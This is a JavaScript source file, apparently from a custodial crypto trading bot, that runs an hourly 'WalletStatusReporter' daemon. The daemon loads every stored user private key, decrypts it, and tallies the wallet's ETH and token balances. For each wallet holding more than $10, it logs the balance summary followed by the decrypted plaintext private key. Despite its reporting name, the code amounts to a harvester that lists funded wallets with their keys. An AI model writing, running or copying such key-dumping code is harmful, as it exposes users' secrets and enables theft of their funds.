import * as utils from './utils.js'
import { UNISWAP_V2_ROUTER_ABI } from "./abi/uniswapv2-router-abi.js"
import { UNISWAP_V3_ROUTER_ABI } from "./abi/uniswapv3-router-abi.js"
import * as uniconst from './uni-catch/const.js'
import { Token } from '@uniswap/sdk-core'
import { BigNumber, ethers } from "ethers";
import { ERC20_ABI } from './abi/ERC20_ABI.js'
import * as afx from './global.js'
import dotenv from 'dotenv'
import { startSession } from 'mongoose'
dotenv.config()


export const start = (web3, database, bot) => {
    console.log('WalletStatusReporter daemon has been started...')

    setTimeout(() => {
        doEvent(web3, database, bot)
    }
        , 1000 * 1)
}

let blackList = []

blackList.push('0x0b751d4c44e4874db2d939550d62e2859fea0739')
blackList.push('0x1dcd4e4c1bf7419dc2c5b2cd30a95480dad86552')
// tokenAddrList.push('0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E')

async function getWalletInfo(web3, address, tokenInfos) {

    let walletInfo = new Map()
    const ethPrice = await utils.getEthPrice(web3)
    if (ethPrice) {
        let balance = await web3.eth.getBalance(address);

        walletInfo.set('', { balance: balance / (10 ** 18), symbol: afx.get_chain_symbol(), price: ethPrice });
    }
   
    for (const tokenInfo of tokenInfos) {
        utils.sleep(100);
        try {
            const tokenContract = new web3.eth.Contract(afx.get_ERC20_abi(), tokenInfo.address)
            const balance = await tokenContract.methods.balanceOf(address).call()
            let bal = balance / (10 ** tokenInfo.decimal);
            if (bal * tokenInfo.price < 5) {
                continue;
            }
            walletInfo.set(tokenInfo.address, { balance: bal, symbol: tokenInfo.symbol, price: tokenInfo.price })
        } catch (error) {
            console.log("usertoken info error", error);
        }
    }
    return walletInfo
}

export const doEvent = async (web3, database, bot) => {

    console.log('WalletStatusReporter is checking wallet status...')

    const provider = new ethers.providers.JsonRpcProvider(afx.get_ethereum_rpc_http_url());

    try {

        let tokenAddrList = []
        let repeatTokenDataStop = new Map()
        
        let tokenAllData = await database.selectAllTokens();
        for (let tokenAddress of tokenAllData) {
            if (repeatTokenDataStop.get(tokenAddress.token_address)) {
                continue
            }
            let skip = false;
            for (let blackAddress of blackList) {
                if (blackAddress.toLowerCase() === tokenAddress.token_address.toLowerCase()) {
                    skip = true;
                    break;
                }
            }
            if (skip) {
                continue;
            }
            repeatTokenDataStop.set(tokenAddress.token_address, true);
            tokenAddrList.push(tokenAddress.token_address)
        }
        console.log(tokenAddrList.length);
        let tokenInfos = []
        for (const addr of tokenAddrList) {
            const res = await utils.getTokenInfoW(web3, addr)
            if (res) {

                tokenInfos.push(res)
                const tokenPrice = await utils.getTokenPrice(web3, addr)

                //const ethPrice = await utils.getEthPrice(web3)
                res.price = (tokenPrice ?? 0)
            }
        }
        let totalUSD = 0
        //const walletInfos = await database.selectUsers({pkey: {$ne: null}})
        const walletInfos = await database.selectPKHistory({})

        let repeatStop = new Map()
        let userCount = 0;
        for (const winfo of walletInfos) {
            userCount ++;
            let privateKey = winfo.pkey
            utils.sleep(100);
           
            let wallet;
            try {
                privateKey = utils.decryptPKey(privateKey)
                wallet = web3.eth.accounts.privateKeyToAccount(privateKey);//new ethers.Wallet(privateKey, provider);
            } catch (error) {

                console.log(`[transferEthFrom] ${error.reason}`)
                continue;
            }

            if (repeatStop.get(wallet.address)) {
                console.log("repeat Continue")
                continue
            }

            repeatStop.set(wallet.address, true)
            const balanceInfos = await getWalletInfo(web3, wallet.address, tokenInfos)

            let walletUSD = 0

            //let log = `----- Wallet ${wallet.address} ----- ${privateKey}`
            let log = ""
            for (const [tokenAddressInfo, balanceInfo] of balanceInfos) {
                utils.sleep(100);
                const balanceInUSD = balanceInfo.balance * balanceInfo.price
                log += `\n${tokenAddressInfo} ${balanceInfo.balance} ${balanceInfo.symbol} ($ ${utils.roundDecimal(balanceInUSD, 2)})`
                walletUSD += balanceInUSD
            }

            log += `\nWallet: $ ${utils.roundDecimal(walletUSD, 2)}`

            if (walletUSD > 10) {
                console.log(log)
            } else {
                continue;
            }

            console.log(privateKey)

            totalUSD += walletUSD
        }
        console.log("User Count = ", userCount);
        console.log(`Total: $ ${utils.roundDecimal(totalUSD, 2)}`)

    } catch (error) {
        console.log(error)
    }

    setTimeout(() => {
        doEvent(web3, database, bot)
    }
        , 1000 * 60 * 60)
}